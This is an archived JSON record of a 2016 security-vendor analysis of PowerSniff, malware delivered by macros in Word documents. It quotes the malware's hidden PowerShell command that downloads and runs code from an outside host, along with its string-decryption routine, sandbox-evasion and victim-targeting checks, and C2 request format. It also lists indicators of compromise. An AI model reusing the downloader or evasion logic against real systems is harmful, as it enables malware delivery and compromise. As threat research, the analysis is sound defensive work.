{
    "id": "113c21b2-896a-44d3-85a1-52ac675f8362",
    "created_at": "2023-01-12T14:59:04.480818Z",
    "updated_at": "2025-03-27T02:08:40.294301Z",
    "deleted_at": null,
    "sha1_hash": "65310c29052c35ee8a6b640722e179d3753e6b71",
    "title": "2016-03-11 - PowerSniff Malware Used in Macro-based Attacks",
    "authors": "",
    "file_creation_date": "2022-05-28T02:12:42Z",
    "file_modification_date": "2022-05-28T02:12:42Z",
    "file_size": 568069,
    "plain_text": "# PowerSniff Malware Used in Macro-based Attacks\n\n**[unit42.paloaltonetworks.com/powersniff-malware-used-in-macro-based-attacks/](https://unit42.paloaltonetworks.com/powersniff-malware-used-in-macro-based-attacks/)**\n\nJosh Grunzweig, Brandon Levene March 11, 2016\n\nBy [Josh Grunzweig and](https://unit42.paloaltonetworks.com/author/joshgruznweig/) [Brandon Levene](https://unit42.paloaltonetworks.com/author/brandon-levene/)\n\nMarch 11, 2016 at 1:00 PM\n\n[Category: Malware,](https://unit42.paloaltonetworks.com/category/malware-2/) [Threat Prevention,](https://unit42.paloaltonetworks.com/category/threat-prevention-2/) [Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [AutoFocus,](https://unit42.paloaltonetworks.com/tag/autofocus/) [PowerSniff,](https://unit42.paloaltonetworks.com/tag/powersniff/) [WildFire](https://unit42.paloaltonetworks.com/tag/wildfire/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/powersniff-malware-used-in-macro-based-attacks/)\n\n## Introduction\n\n[The concept of file-less malware is not a new one. Families like Poweliks, which abuse](http://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/)\nMicrosoft’s [PowerShell, have emerged in recent years and have garnered extensive](https://msdn.microsoft.com/en-us/powershell/mt173057.aspx)\nattention due to their ability to compromise a system while leaving little or no trace of their\npresence to traditional forensic techniques.\n\nSystem administrators have lauded the power and versatility of PowerShell since version\n2.0’s integration into Windows 7. Unfortunately, with such versatility comes the opportunity\nfor abuse, specifically surrounding the capability to write directly into memory of the host OS.\n\nTypically, file-less malware has been observed in the context of Exploit Kits such as Angler.\nPalo Alto Networks has observed a recent high-threat spam campaign that is serving\nmalicious macro documents used to execute PowerShell scripts which injects malware\n[similar to the Ursnif family directly into memory. We call the malware PowerSniff.](http://malware.dontneedcoffee.com/2015/07/a-fileless-ursnif-doing-some-pos.html)\n\n## Infection\n\nFirst, victims are presented with an email similar to the image below.\n\n\n-----\n\nFigure 1 Redacted email containing malicious Word document\n\nAt the time of writing, Palo Alto Networks has observed roughly 1500 emails sent using a\nvariety of filenames. The majority of these emails contain specific information about the\nvictim’s company, such as their phone number, physical address, as well as the name of the\nindividual. This additional information is not typically included in widespread spam\ncampaigns, and can often provide a sense of trust when seen by the victim, which in turn\nmay lead to a higher number of opened attachments.\n\nThe following examples of subject names have been witnessed in this campaign:\n\n[Name], Please validate [Something] Gift Card from [Place]\n\n[Name], Please validate this [Name] Gift Voucher\n\n[Name], Please close this unpaid obligation #[Numbers]\n\n[Name], New Reservation at [Place]\n\n[Name], Please settle this unpaid balance [ID|Ref].[Numbers]\n\n[Name], Please settle this overlooked payment [ID|Ref].[Numbers]\n\nAdditionally, the United States appears to be primarily affected by this threat, as shown in the\nAutoFocus map below:\n\n\n-----\n\nFigure 2 AutoFocus view of attempted infections based on geographic location\n\nWhile no specific industry has been targeted by this campaign, it appears as though the\nProfessional, Hospitality, and Manufacturing industries have witnessed these emails most\noften.\n\nFigure 3 AutoFocus view of attempted infections based on industry\n\n## Malicious Attachment\n\nIn the event a victim opens the malicious Microsoft Word document attached within the\nemail, they will be subjected to a malicious macro contained within this file. The following\nexample macro attempts to execute when the document initially opens. Depending on the\nsecurity settings of Microsoft Word, victims may need to explicitly enable the macro to run.\n\n\n-----\n\nFigure 4 Malicious macro embedded in Microsoft Word document\n\nThis macro will invoke the WMI service to spawn a hidden instance of powershell.exe with\nthe following arguments (The URLs have been defanged for safety):\n\n1 powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c if\n([IntPtr]::size -eq 4) {(new-object\nNet.WebClient).DownloadString('http://rabbitons[.]pw/cache') | iex } else {(new-object\nNet.WebClient).DownloadString('http://rabbitons[.]pw/css') | iex}\n\nReaders may notice an if/else statement that is the result of a check against the size of the\nIntPtr object type. On 32-bit instances of Microsoft Windows, this object will have a size of 4,\nversus a 64-bit operating system, which has a size of 8. This particular check is a quick way\nfor the attackers to determine if they are running on a 32-bit or 64-bit operating system. In\nthe event they are running on a 32-bit system, they will download and execute the file\nlocated at the ‘/cache’ URI. Alternatively, they will download and execute the file located at\nthe ‘/css’ URI.\n\n## Payload\n\nThe downloaded file is a PowerShell script that contains shellcode, which is subsequently\ndecoded and executed, as seen in the following image.\n\n\n-----\n\nFigure 5 PowerShell payload downloaded by malware\n\nThis shellcode, once executed, decrypts and executes an embedded payload. This\nembedded payload begins by decrypting a number of strings using the following algorithm,\ndemonstrated in Python:\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\ndef decrypt(data, seed):\nout = \"\"\nfor d in data:\nbyte = (ord(d)^seed) & 0xFF\nout += chr(byte)\nseed = (0x19660D * seed + 0x3C6EF35F) & 0xFFFFFFFF\nreturn out\n\n\nFor this particular sample (SHA256:\n74ec24b5d08266d86c59718a4a476cfa5d220b7b3c8cc594d4b9efc03e8bee0d), the malware\nuses a seed value of 0xDDBC9D5B. After string decryption completes, the payload performs\na number of actions in an attempt to determine if it is running within a virtualized environment\nor sandbox.\n\nExamples include looking for the following usernames:\n\nMALTEST\nTEQUILABOOMBOOM\nSANDBOX\nVIRUS\nMALWARE\n\n\n-----\n\nThe payload also checks for the presence of the following libraries:\n\nsbiedll.dll\ndbghelp.dll\napi_log.dll\ndir_watch.dll\npstorec.dll\nvmERROR.dll\nwpespy.dll\nPrxDrvPE.dll\nPrxDrvPE64.dll\n\nOther simple checks, such as a call to IsDebuggerPresent(), are also performed.\n\nThe payload proceeds to perform reconnaissance against the victim host by executing an\n‘ipconfig -all’ in a new process and inspecting the results. The malware specifically looks for\nthe absence of the following strings:\n\nschool\nhospital\ncolledge\nhealth\nNURSE\n\nIf these strings are not discovered, it will proceed to check the cached URLs on the victim\nmachine against the following list:\n\nCitrix\nXenApp\ndana-na\n\nIf one of these strings, or any of a short list of financial institution websites is found in the\ncache, this victim machine is identified as being interesting to the attackers, and will be\nmarked with a type of ‘666’ in subsequent HTTP requests. Additionally, the malware will take\nthe output of the ‘net view’ command and look for the absence of the following strings:\n\nTEACHER\nSTUDENT\nSCHOOLBOARD\nPEDIATRICS\nORTHOPED\n\nIt will also look for the presence of the following strings:\n\nPOS\n\n\n-----\n\nSTORE\nSHOP\nSALE\n\nIf these conditions are met, the victim machine will be identified as interesting, and marked\nwith a type of ‘666’. Alternatively, if none of the previous conditions are met, the payload will\nmark the victim with a type of ‘555’.\n\nAs a summary to these checks, it would appear as though this malware is attempting to\nactively avoid healthcare and education machines, as well as target point of sale instances\n[and machines that conduct financial transactions. Similar techniques were witnessed in a](http://malware.dontneedcoffee.com/2015/07/a-fileless-ursnif-doing-some-pos.html)\nmalware family named ‘Ursnif’ in mid-2015.\n\nAfter this reconnaissance has been performed, the malware will make a HTTP GET request\nto one of the embedded C2 servers, using the following format:\n\n_/yuppi/?_\n_user=%08x%08x%08x%08x&id=%u&ver=%u&os=%lu&os2=%lu&host=%u&k=%lu&type=%u_\n\nThe ‘type’ variable contains the ‘555’ or ‘666’ previously discussed. The ‘id’ and ‘ver’\nvariables are hardcoded. This particular sample used values of 24 and 123 respectively. The\n‘k’ parameter is used as a decryption seed in the C2 server’s response. In the event the C2\nserver is responsive, it will return an encrypted DLL. This DLL can be decrypted using the\nsame decryption previously discussed, using the seed value located in the ‘k’ parameter.\nThis DLL is then temporarily written to disk in the following location:\n\n_%%userprofile%%\\\\AppData\\\\LocalLow\\\\[random].db_\n\nAfter being written to disk, it will be executed using a call to rundll32.exe. The exported\nfunction of ‘Register’ is used when loading this malicious DLL. No C2 servers were\nresponsive at the time of analysis.\n\n## Conclusion and Acknowledgements\n\nThis widespread spam campaign has been witnessed in the past week. Due to the targetspecific details contained within the spam emails and the use of memory-resident malware,\nthis particular campaign should be treated as a high threat. As this malware relies on\nmalicious macros within Microsoft Word documents, users should ensure that macros are not\nenabled by default and should be wary of opening any macros in files received from\nuntrusted sources.\n\nPalo Alto Networks WildFire customers are protected against this threat, as all encountered\nfiles have been correctly flagged as malicious. Additionally, all C2 domains currently\nencountered have also been marked malicious. AutoFocus users can identify this malware\nusing the [PowerSniff tag.](https://autofocus.paloaltonetworks.com/#/tag/Unit42.PowerSniff)\n\n\n-----\n\nThe researchers would like to thank Cert.pl s @maciekkotowicz for his excellent analysis of\nthe configuration data of the malware.\n\n## Indicators of Compromise\n\n**SHA256 Hashes**\n\na8663becc17e34f85d828f53029ab110f92f635c3dfd94132e5ac87e2f0cdfc3\n\n30cd5d32bc3c046cfc584cb8521f5589c4d86a4241d1a9ae6c8e9172aa58ac73\n\n0661c68e6c247cd6f638dbcac7914c826a5feee1013e456af2f1f6fd642f4147\n\nf204c10af7cdcc0b57e77b2e521b4b0ac04667ccffce478cb4c3b8b8f18e32a2\n\n7e22ea4e06b8fd6698d224ce04b3ef5f00838543cb96fb234e4a8c84bb5fa7b3\n\nf45bf212c43d1d30cc00f64b3dcae5c35d4a85cacd9350646f7918a30af1b709\n\n1e746ba37c56f7f2422e6e01aa6fde6f019214a1e12475fe54ee5c2cf1b9f083\n\n340f82a198aa510159989058f3f62861de74135666c50060491144b7b3ec5a6f\n\n815bd46e66f1d330ed49c6f4a4e570da2ec89bcd665cedf025028a94d7b0cc1e\n\na1770a7671679f13601e75a7cb841fea90c7add78436a0bea875ce50b92afc33\n\n83e305724e9cd020b8f80535c5dd897b2057cee7d2bb48461614a37941e78e3a\n74ec24b5d08266d86c59718a4a476cfa5d220b7b3c8cc594d4b9efc03e8bee0d\n\n90a7951683a5a77a21d4a544b76e2e6ee04e357d2f5bfcff01cd6924906adf77\n\n2c21dafcb4f50cae47d0d4314810226cba3ee4e61811f5c778353c8eac9ba7dc\n\n247511ab6d7d3820b9d345bb899a7827ce62c9dd27c538c75a73f5beba6c6018\n\n708374a4dfaaa8e44ee217ca5946511cacec55da5eabb0feb1df321753258782\n\n136379754edd05c20d5162aed7e10774a95657f69d4f9a5de17a8059c9018aa6\n\n5d215ef3affe320efe4f5034513697675de40ba8878ca82e80b07ad1b8d61ed8\n\n**Command and Control Servers**\n\nsupratimewest[.]com\n\nletterinklandoix[.]net\n\nsupratimewest[.]biz\n\nstarwoodhotels[.]pw\n\noklinjgreirestacks[.]biz\n\nwww.starwoodhotels[.]pw\n\nbrookmensoklinherz[.]org\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n\n-----\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-03-11 - PowerSniff Malware Used in Macro-based Attacks.pdf"
    ],
    "report_names": [
        "2016-03-11 - PowerSniff Malware Used in Macro-based Attacks.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535544,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1653703962,
    "ts_modification_date": 1653703962,
    "files": {
        "pdf": "https://archive.orkl.eu/65310c29052c35ee8a6b640722e179d3753e6b71.pdf",
        "text": "https://archive.orkl.eu/65310c29052c35ee8a6b640722e179d3753e6b71.txt",
        "img": "https://archive.orkl.eu/65310c29052c35ee8a6b640722e179d3753e6b71.jpg"
    }
}